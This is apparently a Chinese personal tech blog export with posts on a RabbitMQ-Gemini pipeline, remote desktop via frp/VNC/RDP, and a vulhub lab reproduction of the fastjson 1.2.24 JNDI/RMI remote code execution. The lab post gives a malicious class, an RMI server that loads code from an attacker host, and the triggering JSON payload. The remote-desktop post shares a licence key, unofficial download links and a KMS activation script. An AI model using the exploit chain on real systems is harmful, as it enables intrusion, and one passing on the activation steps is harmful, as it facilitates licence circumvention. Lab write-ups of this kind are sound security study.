status的时候会发现一切都正常起来了\n\n\n如果在执行完所有的命令之后确认: 网页无法访问&#x2F;windwos服务状态关闭&#x2F;端口监听关闭然后执行命令rabbitmqctl status这个时候的报错是正常的,因为他的检查状态原理是和节点连接,但是节点已经关闭,下面是AI解释\n\nrabbitmqctl status 的工作原理    \n\n该命令需要与运行的RabbitMQ节点（Erlang虚拟机）建立连接，获取状态信息。\n\n节点未运行时：由于目标节点 rabbit@LAPTOP-HB2HIA34 已通过 rabbitmqctl stop 关闭，EPMD（Erlang端口映射守护进程）会直接返回“节点未运行”的提示（如诊断信息所示）。\n\n\n\n这是预期行为：节点停止后，rabbitmqctl status 必然报错，因为无法与不存在的进程通信。\n\n您的操作逻辑矛盾点\n\n您已明确停止服务（rabbitmqctl stop），此时节点进程已终止。\n\n端口无占用：5672（AMQP）和15672（管理插件）无监听，进一步证明服务已完全关闭。\n\n此时检查状态无意义：停止的服务无法返回状态信息，报错是正常的。\n\n\n\n\nRabbitMQ默认端口RabbitMQ的主要端口号\nRabbitMQ默认使用以下端口号：\n\n5672：这是RabbitMQ的默认端口，用于AMQP协议（不带TLS）的客户端连接。\n5671：当使用TLS加密连接时，AMQP协议会使用这个端口。\n15672：如果启用了管理插件，这个端口用于访问RabbitMQ的Web管理界面，默认用户名和密码都是guest。\n15674：这个端口与Web STOMP插件相关，允许通过WebSocket连接使用STOMP协议。\n\n协同python简单例子\n启动RabbbitMQ Server\n# 启动插件rabbitmq-plugins enable rabbitmq_managementrabbitmq-server.bat# 检查是否启动成功rabbitmq-server.bat status\n\nPycharm启动一个新的项目(独立项目避免环境冲突)路径 + 项目名\n\n连接端口和密码,这里使用的都是默认的参数账号密码: guest guest端口: 5672web管理页面(这是通过插件打开的): http://localhost:15672/#/\n\n生产者代码\nimport pikaimport jsoncredentials = pika.PlainCredentials(&#x27;guest&#x27;, &#x27;guest&#x27;)  # mq用户名和密码# 虚拟队列需要指定参数 virtual_host，如果是默认的可以不填。connection = pika.BlockingConnection(pika.ConnectionParameters(host = &#x27;localhost&#x27;,port = 5672,virtual_host = &#x27;/&#x27;,credentials = credentials))channel=connection.channel()# 声明消息队列，消息将在这个队列传递，如不存在，则创建result = channel.queue_declare(queue = &#x27;python-test&#x27;)for i in range(10):    message=json.dumps(&#123;&#x27;OrderId&#x27;:&quot;1000%s&quot;%i&#125;)# 向队列插入数值 routing_key是队列名    channel.basic_publish(exchange = &#x27;&#x27;,routing_key = &#x27;python-test&#x27;,body = message)    print(message)connection.close()\n\n消费者代码\nimport pikacredentials = pika.PlainCredentials(&#x27;guest&#x27;, &#x27;guest&#x27;)connection = pika.BlockingConnection(pika.ConnectionParameters(host = &#x27;localhost&#x27;,port = 5672,virtual_host = &#x27;/&#x27;,credentials = credentials))channel = connection.channel()# 申明消息队列，消息在这个队列传递，如果不存在，则创建队列channel.queue_declare(queue = &#x27;python-test&#x27;, durable = False)# 定义一个回调函数来处理消息队列中的消息，这里是打印出来def callback(ch, method, properties, body):    ch.basic_ack(delivery_tag = method.delivery_tag)    print(body.decode())# 告诉rabbitmq，用callback来接收消息channel.basic_consume(&#x27;python-test&#x27;,callback)# 开始接收信息，并进入阻塞状态，队列里有信息才会调用callback进行处理channel.start_consuming()\n\n协同AI本次使用的协同ai是gemini,申请api网址如下: \n全局代理设置为了不去搞懂每个库的代理到底要怎么设置,直接偷个小懒,使用全局socks5代理,我使用的是v2ray,也可以代理到对应的代理端口上,注意Gemini Api的地区使用政策,如果发现挂了代理出页面但是不能直接上就可能是地区选择有问题\n\n库安装\npip install -r requestments# 或者pip install PySockspip install pikapip install pip install google-genai\n\nrequestments\nannotated-types==0.7.0anyio==4.9.0cachetools==5.5.2certifi==2025.7.14charset-normalizer==3.4.2colorama==0.4.6exceptiongroup==1.3.0google-ai-generativelanguage==0.6.15google-api-core==2.25.1google-api-python-client==2.177.0google-auth==2.40.3google-auth-httplib2==0.2.0google-genai==1.27.0google-generativeai==0.8.5googleapis-common-protos==1.70.0grpcio==1.74.0grpcio-status==1.71.2h11==0.16.0httpcore==1.0.9httplib2==0.22.0httpx==0.28.1idna==3.10pika==1.3.2proto-plus==1.26.1protobuf==5.29.5pyasn1==0.6.1pyasn1_modules==0.4.2pydantic==2.11.7pydantic_core==2.33.2pyparsing==3.2.3PySocks==1.7.1requests==2.32.4rsa==4.9.1sniffio==1.3.1tenacity==8.5.0tqdm==4.67.1typing-inspection==0.4.1typing_extensions==4.14.1uritemplate==4.2.0urllib3==2.5.0websockets==15.0.1\n\n\n\nnew socks5_global_proxy\nimport socksimport socket# Proxy detailsproxy_ip = &quot;127.0.0.1&quot;  # Replace with your SOCKS5 proxy IP addressproxy_port = 10808  # Replace with your SOCKS5 proxy port# Optional: Authentication if your proxy requires it# username = &quot;your_username&quot;# password = &quot;your_password&quot;# Set up the SOCKS proxysocks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)# If authentication is required:# socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port, username=username, password=password)# Patch the default socket to use PySockssocket.socket = socks.socksocket\n\n在需要代理的项目直接import\nfrom socks5_global_proxy import *\n\n代码设置\nGemini测试代码\nfrom socks5_global_proxy import *from google import genai# 初始化客户端client = genai.Client(api_key=&quot;YOUR_API_KEY&quot;)# 发送请求response = client.models.generate_content(    model=&quot;gemini-2.5-pro&quot;,    contents=&quot;你是谁&quot;,)# 输出结果print(response.text)\n\n封装成接口来供调用\nfrom socks5_global_proxy import *from google import genaiwith open (&#x27;tishici.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:    tishici = f.read()def Gemini_replay(contents):    # 初始化客户端    client = genai.Client(api_key=&quot;YOUR_API_KEY&quot;)    # 发送请求    response = client.models.generate_content(        model=&quot;gemini-2.5-pro&quot;,        contents=str(tishici) + str(contents),    )    # 输出结果    return response.text\n\n消费者生产代码\nimport pikafrom 另一个封装好的对象类 import *from Gemini_api_test import *credentials = pika.PlainCredentials(&#x27;guest&#x27;, &#x27;guest&#x27;)connection = pika.BlockingConnection(pika.ConnectionParameters(host = &#x27;localhost&#x27;,port = 5672,virtual_host = &#x27;/&#x27;,credentials = credentials))channel = connection.channel()# 申明消息队列，消息在这个队列传递，如果不存在，则创建队列channel.queue_declare(queue = &#x27;craxpro&#x27;, durable = False)# 定义一个回调函数来处理消息队列中的消息，这里是打印出来AAAA = 另一个封装好的对象类()def callback(ch, method, properties, body):    ch.basic_ack(delivery_tag = method.delivery_tag)    # print(body.decode())    all_content = json.loads(body.decode())    print(f&quot;正在处理:&#123;all_content[&#x27;title&#x27;]&#125;&quot;)    post_url = all_content[&#x27;post_url&#x27;]    content = AAAA.get_content(post_url)    all_content[&#x27;content&#x27;] = content    print(Gemini_replay(all_content))# 告诉rabbitmq，用callback来接收消息channel.basic_consume(&#x27;另一个封装好的对象类名&#x27;,callback)# 开始接收信息，并进入阻塞状态，队列里有信息才会调用callback进行处理channel.start_consuming()\n\n","categories":["中间件配置学习"],"tags":["中间件","rabbitmq"]},{"title":"局域网远程控制一站式解决方案","url":"/2024/12/12/%E6%8A%80%E6%9C%AF/%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BE%BF%E6%8D%B7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","content":"\n有点麻烦的非局域网远程桌面方法：开源项目frp\n\n发展历程\n在内网环境中出门不想要带电脑，希望能够免费实现远程控制\n离开内网环境还希望使用远程控制\n离开内网环境仍然希望使用内网资源，但是同时用不想使用官方的VPN，希望自建隧道\n管理登录信息,做好未授权登录溯源准备\n\n能够自己控制的外网远程桌面frp配置\n作为go语言编码的程序，frp适用于所有平台，在本次案例使用中，将主要使用tcp和stcp，官方参考文档\nfrp是一个内外穿透的解决方案，用来对抗大内网环境下多层Nat不同环境下的设备无法直接通信的的问题，实现原理就是通过内网设备不断向一个具有公网IP的服务器发送数据来保持连接，当需要内网穿透的时候，就把内网的某个特定端口0数据发送到该服务器的特定端口上1，由该台服务器进行转发到另一个特定端口2；而当特定端口2收到数据后，就会原封不动的进行转发到内网设备的特定端口0上\n\n模式区别\nTCP：顾名思义，就是代理内网的端口数据传输层都是使用tcp，例如本文中提到的对于VNC，RDP都是使用了tcp进行传输。而下文出现的http模式本质也是在传输层使用了http，所以对于需要穿透多个http服务，也可以使用tcp模式\nSTCP：就是给tcp数据包进行加密，就要求在内网穿透的两台设备：提供安全的 TCP 内网代理，要求在被访问者和访问者的机器上都部署 frpc，不需要在服务端暴露端口。这样可以在一定程度上保证信息传递的安全性，然而由于是静态对称密钥并且多层NAT中转服务器不可能被全部信任，传输的信息也并不是绝对安全。而且由于加密解密，可能会出现卡顿的情况。\nUDP：穿透端口的服务使用udp\nSUDP：提供安全的 UDP 内网代理，与 STCP 类似，需要在被访问者和访问者的机器上都部署 \nHTTP：专为 HTTP 应用设计，支持修改 Host Header 和增加鉴权等额外功能。\nHTTPS：类似于 HTTP 代理，但专门用于处理 HTTPS 流量。\nXTCP：点对点内网穿透代理，与 STCP 类似，但流量不需要经过服务器中转。但实际上在多层NAT的国内环境下，该模式的使用条件严重受限\nXTCP：点对点内网穿透代理，与 STCP 类似，但流量不需要经过服务器中转。\n\n配置文档\nServer\n[common]dashboard_user=admindashboard_pwd=admin123dashboard_port=7777bind_port=7778bind_addr=0.0.0.0dashboard_addr=0.0.0.0token=aaabbbbccc\n\nClient\n  [common]server_addr = 10.159.103.181server_port = 7778token=aaabbbbccc[proxy2]type = tcp local_ip = 127.0.0.1local_port = 50050remote_port = 50050\n\n启动命令对于个平台下的frp都需要使用命令行进行启动：应用 + 参数 + 配置文档\n\nLinux ./frpc -c ./frpc.tomlnohup ./frps -c ./frps.ini &gt; test.log 2&gt;&amp;1 &amp; #服务端使用了绝对路径需要保存日志，&gt;&gt;输出到test.log\nWindows.\\frpc -c .\\frpc.toml\n\n内网远程桌面\n本文使用了VNC和RDP进行实现远程桌面选择VNC服务的时候使用了VNC server当然tigerVNC也不愧为一个好选择，本文只介绍VNC server\n\nWindows实现免休眠系统免休眠\nwin + r输入control打开控制面板，切换路径：控制面板\\硬件和声音 \n\n编辑电源选项\n​    更改计算机睡眠时间，设置为插电状态下永不熄屏\n\n切换路径：控制面板\\硬件和声音\\电源选项\\系统设置 ，在其中关闭启动快速启动\n \n\n可以进一步设置，合上盖子后不休眠，设置操作为不进行任何操作\n\n就可以实现合上盖子之后仍然使用远程桌面。\n\n然而实际上合上盖子之后会认为屏幕停止工作而无法使用vnc，所以需要购买显卡欺骗器或者是安装驱动实现一个虚拟屏幕的作用。\n\n我本人更加推荐显卡欺骗器，主要是因为功耗的原因，当然具体的功耗差异也并没有下功夫实际去测量过\n\n这两种方法使用之后使用sunshine进行串流使用其他设备当副屏时也是一个很好的选择。\n\n\n\n\n网卡免休眠\nwin + r 呼出运行，输入devmgmt.msc打开设备管理器\n在网络适配器中找到对应网卡，打开属性\n在电源管理标签中取消允许计算机关闭此设备以节约电源\n但是默认并不能找到这个标签，打开cmd输入以下命令即可出现该页面，如何执行2-3reg add HKLM\\System\\CurrentControlSet\\Control\\Power /v PlatformAoAcOverride /t REG_DWORD /d 0\n\nrealVNC服务端下载：\n官方网址\n[学习者测试版本私链下载](链接: https://pan.baidu.com/s/1C3R0gfQVsw75ECwiwvGhqw 提取码: 4svv 复制这段内容后打开百度网盘手机App，操作更方便哦) 激活码：FBV9V-7Z3V9-MED3U-47SEU-85T3A\n\nVNCViewer下载\n作为远程访问软件，VNCViewer支持远程控制所有使用VNC服务的设备\n\n官网下载\n\n\n\n安卓端：GooglePlay下载\nWindows端：私链下载：[①](链接: https://pan.baidu.com/s/12vct5MEDoBORnaU26cl1DQ 提取码: vcat 复制这段内容后打开百度网盘手机App，操作更方便哦)，[②](链接: https://pan.baidu.com/s/1wgyn-e4j9dQhC4ed9MtfTg 提取码: 24fe 复制这段内容后打开百度网盘手机App，操作更方便哦)\nios端：AppStore下载\n\nRDP实现实现条件\nWindows专业版\n\n打开指南：   设置 - 系统 - 远程桌面\n若是非专业版：\n按照提示正常进入商店页面升级Windows版本选择“开始”&gt;“设置”&gt;“系统”&gt;“激活”。\n在“激活”页面顶部，可以看到你的版本：家庭版或专业版。 你还将在“激活状态”下看到是否已激活。  \n选择使用产品密钥进行升级，百度参考：①，②，③\n\n突发情况解决：\n对于Windows的某些版本，可能出现密钥验证通过但是无法激活\n\n\n断网激活：在最后的激活步骤的时候关闭网络，尝试离线激活，但是如果重启后显示为未激活的专业版则需要见2\n使用代码进行激活:新建一个文本文档，粘贴以下代码并且填入专业版密钥后修改文件格式为.bat，双击运行slmgr /ipk &lt;粘贴密钥&gt;slmgr /skms kms.03k.org slmgr /ato\n会出现小窗页面，一路确定即可\n\n启动RDP在设置中搜索远程桌面并且打开\n\n异常情况无法正常登录有可能是登录了微软账户导致本地权限不足,可以在设置-&gt;远程桌面-&gt;远程桌面用户 中添加权限\n安全解决情况端口修改\n各类扫描工具中的快速扫描都会对于这些端口进行着重扫描，若是想要避开扫描工具的全网段快速扫描行为，就务必要对端口进行修改建议端口修改范围为：10000 - 65536，并且应该尽量避开大整数的端口\n\n修改端口后需要手动开放防火墙端口设置 - 隐私和安全中心 - Windows安全中心 - 打开Windows安全中心 - 防火墙和网络程序保护\n\n\n   \n打开高级设置\n\n\n编辑出入站规则，添加对应应用程序和希望自定义的端口\n\n在以下的修改端口操作完成后，想用访问设备，由于不是默认端口，需要手动指定端口，因此在输入IP地址的时候需要手动添加端口，例如IP为127.0.0.1，端口为13389则\n 127.0.0.1:13389\n\n\nVNC的默认端口为5900，在options - Connections - Port中进行修改 \nRDP的默认端口为3389\n\n\nwin + r输入regedit打开注册表\n依次在注册表左侧找到HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentContro1Set\\Control\\Tenninal Server\\WinStations\\RDP-Tcp\n右侧找到Portnumber，默认端口为3389\n\n\n\n双击打开，用十进制修改为目标端口\n\n\n登录日志查看VNC Serverwin+r输入eventvwr.msc或者win搜索事件,进入windwos事件查看器\n导航到Windows 日志 → Application（应用程序日志）使用功能: 查找 -&gt; VNC Server\n\n发现对应的登录事件ID是 256\n\n筛选当前日志\n\nRDP 登录日志使用win+r打开运行键入eventvwr.msc打开事件查看器\n导航到：应用程序和服务日志 --&gt; Microsoft --&gt; Windows --&gt; TerminalServices- RemoteConnectionManager，右键单击Operational并选择筛选当前日志。\n远程事件id: 1149, 其他同上\n","categories":["技术"],"tags":["VNC","远程桌面"]},{"title":"fastjson_1.2.24-rce","url":"/2025/09/23/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/fastjson/1.2.24-rce/fastjson_1.2.24-rce/","content":"\n依据vulhub&#x2F;fastjson&#x2F;1.2.24-rce&#x2F;README.zh-cn.md at master · vulhub&#x2F;vulhub进行复现\n参考Java反序列化工具-marshalsec-腾讯云开发者社区-腾讯云进行marven|marshalsec进行环境搭建\n\n我理解的fastjson的面试回答wocao我当时真不会啊简历那都是瞎写的，来电话的时候很突然直接就开始面试了没背面经，直接给了\n原理就是依靠rmi来实现远程执行本地服务端(攻击机)的接口调(恶意治疗)命令fastjson的性质就是阿里巴巴开发用来反序列化json文本成为java对象的一个中间件。为了记录原对象，序列化的json对象中会有一个@type的键值对，这个就是用来记录序列化前的对象用来定位。进一步利用就是在rmi&#x2F;ladp这种远程资源调用的时候会返回一个reference，这里面传递的url是前端可控。那么根据fastjson的机制，这个远程资源将会被本地jvm加载，由于恶意payload中的恶意代码是使用static来进行，所以会直接运行。\nfastjson实现的链（Gadget Chain）\n发送json给fastjson进行反序列化\n看到@type之后使用反射机制创建一个**com.sun.rowset.JdbcRowSetImpl** 实例。\n在使用setter设置属性的时候使用了setAutoCommit(true)， 这个方法在内部代码逻辑上，强制调用了 connect()\n这就会读取dataSourceName属性并且使用JNDI来发起远程查询（当成数据库了）\nRMI服务器返回一个恶意的Reference引用，根据java的自带逻辑会加载这个恶意类到jvm中，由于存在static属性，所以恶意类会被直接执行。\n\nfastjson开始打靶\n靶场环境搭建这一块\n心路历程这一块\n\nfastjson利用原理\n参考文档: \n\nFastjson反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_fastjson漏洞原理-CSDN博客](https://blog.csdn.net/Bossfrank/article/details/130100893)\n\nvulhub&#x2F;fastjson&#x2F;1.2.24-rce&#x2F;README.zh-cn.md at master · vulhub&#x2F;vulhub\n\n\n\nfastjson用于处理json和java对象之间的序列化和反序列化关系。\t在进行序列化[java–&gt;json]的时候，fastjson主要是使用对象中的getting来进行序列化，将实例对象的内容以字符串的形式添加入json中，这就导致了序列化之后的json能够保存对象的所有内容，但是不能保存对象的来源（也就是说不能够保存接口类），也就是说正常情况下一下两种 实例化对象序列化之后的内容是完全一样的，无法区分谁是谁：\nclass Apple implements Fruit &#123;    private Big_Decimal price;    //省略 setter/getter、toString等&#125; class iphone implements Fruit &#123;    private Big_Decimal price;    //省略 setter/getter、toString等&#125;\n\n​\t为了解决这种问题，fastjson使用SerializerFeature.WriteClassName对序列化之后的内容进行标记，将@type添加到序列化的json中来标识每个json的来源，以便反序列化的时候能够定位到具体的原始对象的setting来重新进行反序列化生成新的java对象，这个就是AutoType，和引入AutoType的原因。\n​\t实际上可以发现决定漏洞是否存在的就是这个AutoType，在fastjson2之后没有显式允许的时候不允许使用来提升安全性。\n开始攻击环境清单（详情见环境搭建）\n靶机vulhub fastjson1.2.24-rce\n攻击机：docker image: justrydeng&#x2F;jdk8 + mvn + marshalsec\n\n网络清单\n网络连通性检查\n 由于docker-compose的网卡和默认run启动的网卡不一样，所以需要手动联通一下\n sudo docker network ls\n\n \n 那么需要联通的就是网卡1224-rce_default和bridge\n 使用命令\n sudo docker network connect 1224-rce_default jdk8\n\n\n靶机：挨打，开放端口8090：8090 docker-compose专用网卡，同时互联到bridge网卡，保证能和攻击机互通\n\n攻击机：保证内部互通的前提下\n\n提供类的文件服务器\n我直接放靶场环境下了，使用python http服务器提供，也就是虚拟机本体（非docker，必然可以实现连通）\n\n\n攻击步骤\n访问ubuntu.vulhub:8090，发送json实现修改json内容证明存在fastjson框架\n\n运行恶意类的文件服务器\npython -m http.server\n\n\n\n使用命令javac TouchFile.java来获得这个类TouchFile.class\n// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile &#123;    static &#123;        try &#123;            Runtime rt = Runtime.getRuntime();            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/successFrank&quot;&#125;;            Process pc = rt.exec(commands);            pc.waitFor();        &#125; catch (Exception e) &#123;            // do nothing        &#125;    &#125;&#125;\n\n\n\n使用marshalsec启动一个rmi服务器指向恶意类的文件服务器就是这个类marshalsec.jndi.RMIRefServer启动的rmi服务器，并且把http://172.17.0.1:8000/#TouchFile这个地址绑定到3000端口上\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://172.17.0.1:8000/#TouchFile&quot; 3000\n\n实际上这是marshalsec封装好了的代码.也可以自己写,可以更清楚的展现出对应的Reference调用的过程\npackage rce;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer &#123;    public static void main(String[] args) throws Exception &#123;        Registry registry = LocateRegistry.createRegistry(3000);        Reference reference = new Reference(&quot;TouchFile&quot;, &quot;TouchFile&quot;, &quot;http://172.17.0.1:8000/&quot;); //类名/方法名/访问的http地址        ReferenceWrapper wrapper = new ReferenceWrapper(reference);        registry.bind(&quot;colf&quot;, wrapper);  //只要访问这个colf,就会被映射到上面的TouchFile上    &#125;&#125;\n\n\n\n使用POST向靶机发送payload\n&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://172.19.0.3:3000/TouchFile&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;\n\n三方反应\n恶意文件服务器\n\n靶机\n恶意类中构造的路径/tmp/successFrank\n\n攻击机\n\n\n疑惑点**Question1：**JNDI欺骗加载了类，为什么会执行？\n\n利用 static 静态代码块，在 Java 规范中，当一个类被 JVM 首次加载和初始化时，JVM 会立即执行该类的所有 静态代码块 (static &#123;&#125;)，并且只执行一次。\n在TouchFile.java中是这样的，所以会直接执行\npublic class TouchFile &#123;     static &#123;\n\n攻击payload中使用了com.sun.rowset.JdbcRowSetImpl,会调用connect()会触发查询在fastjson反序列化设置dataSourceName和autoCommit的时候会使用setter，这个方法在内部代码逻辑上，强制调用了 connect() 方法。而 connect() 方法正是负责发起 JNDI 查询的地方。根据JNDI标准，当收到的Reference指向一个远程代码库的时候就会执行：连接-下载-加载到jvm中当加载的时候，这个恶意代码就被执行了\n\n\n攻击环境搭建基本环境\n使用docker来找一个jdk8的环境,这边找的是镜像: justrydeng&#x2F;jdk8\n\n使用命令搭建一个容器:\nsudo docker run -it -p 3000:3000 --name jdk8 justrydeng/jdk8 /bin/bash\n\n要是一个shell不够还需要一个,执行:\ndocker ps #查找所有正在运行的容器docker exec -it 容器名 /bin/bash\n\n容器中没有好用的网络工具和文本编辑工具,需要使用apt手动下载,由于之前设置了docker的代理,所以这里不需要考虑网络问题\n\n\n安装maven(抄袭上文提到的博客)\nMaven安装:  https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz \n\n解压后复制文件目录到/usr/local, 修改文件setting.xml\ntar -xzvf apache-maven-3.6.3-bin.tar.gzdocker cp ./apache-maven-3.6.3-bin.tar.gz/ 容器名:/user/local # 复制到docker中cd confnano setting.xml \n\nctrl+w : localRepository修改&lt;localRepository&gt;/usr/local/apache-maven-3.6.3/repo&lt;/localRepository&gt;\n\n\nctrl+W: mirror去掉注释修改&lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;&lt;/mirror&gt;\n\n\n\n修改环境变量并且应用该修改的环境变量\nnano /etc/profile# maven settingexport MAVEN_HOME=/usr/local/apache-maven-3.6.3export PATH=$PATH:$MAVEN_HOME/bin\n\nsource /etc/profile\n\n测试是否部署成功\nmvn -v\n\n没成功, java环境有问题\n\n\n然后就发现其实是骗你的,根本就没有文件夹jdk1.8.0_191,java直接就被安装在了/usr/local\n重新配置环境变量\n# java settingexport JAVA_HOME=/usr/localexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH\n\n应用\nsource /etc/profile\n\n成功\n\n\n\n编译安装marshalsec去github上拉取,进入目录,执行编译命令\nmvn clean package-DskipTests\n\n本地会出现一个target/路径,cd进去\n这就对了,然后就可以坐等开饭了\n知识回顾666忘记什么是interface接口了java中interface接口不定义具体内容 只是规定必要的方法，而继承的类可以定义自己的方法\npublic interface CanSwim &#123;    void swim();&#125;\n\n// 鸭子类实现了 CanSwim 接口public class Duck implements CanSwim &#123;    @Override    public void swim() &#123;        System.out.println(&quot;鸭子在水里划水。&quot;);    &#125;    // 鸭子特有的方法    public void quack() &#123;        System.out.println(&quot;嘎嘎嘎！&quot;);    &#125;&#125;// 狗类也实现了 CanSwim 接口public class Dog implements CanSwim &#123;    @Override    public void swim() &#123;        System.out.println(&quot;狗在水里狗刨。&quot;);    &#125;    // 狗特有的方法    public void bark() &#123;        System.out.println(&quot;汪汪！&quot;);    &#125;&#125;\n\n\n\nrmi(真不会啊 学习一下)有点像JavaScript的rpc\n\n远程调用实现\n\n存在三方: 服务端, 注册中心(通常和服务端在一台设备,但是不是一个应用),客户端\n\n客户端只有接口但是没有具体的实现类, 服务端有具体的接口实现类, 客户端通过注册中心在服务端上执行命令(可能返回,但是具体类的方法实现还是在服务端进行的)\n\n服务端的前提: 绑定(create)一个注册中心 + 把实现类绑定到注册中心\nRegistry registry = LocalRegistry.createRegistry(1099)registry.rebind(&quot;calc&quot;, UnicastRemoteObject.exportObject(calc,0)\n\n\n\n客户端前提: 用本地的注册中心去获取远程的注册中心\nRegistry registry = LocalRegistry.getRegistry(&quot;remoteip&quot;,1099)Remote calc = registry.lookup(&quot;calc&quot;)  //获取远程实现类放到本地.但是应该定义成本地已知的接口类型// 也就是这样Calc calc = (Calc) registry.lookup(&quot;calc&quot;)\n\nJNDI注入\nJNDI: The java Naming and Directory Interface java密码和目录接口，是一组在java应用中访问命名和目录服务器的API，在目录中记录了许多资源的位置，允许用户通过名称去访问。\n也就是说，JNDI的出现允许用户通过一个统一的接口去查找和访问各种远程资源，能够用来定位：用户、网络、机器、对象和服务器等各种资源。比如局域网上一台打印机，数据库服务或者一个远程JAVA对象\n\n\n\nRMI\nLDAP\nDNS\n\n后端漏洞条件\nladp\n只要这个url是可以控的(前端传过去的),并且执行了lookup方法\nimport javax.naming.InitialContext;import javax.naming.NamingException;public class App&#123;    public static void main(String[] args) throws NamingException&#123;        String url = &quot;ladp:http://127.0.0.1:7777/ExploitObject&quot;;        InitialContext initialContext = new InitialContext();        initiakContext.lookup(url);    &#125;&#125;\n\nrmi漏洞成因(实际上上面的ladp也差不多)\n\n\n\n","categories":["vulhub漏洞复现"],"tags":["docker","fastjson","rmi","JDNI"]}]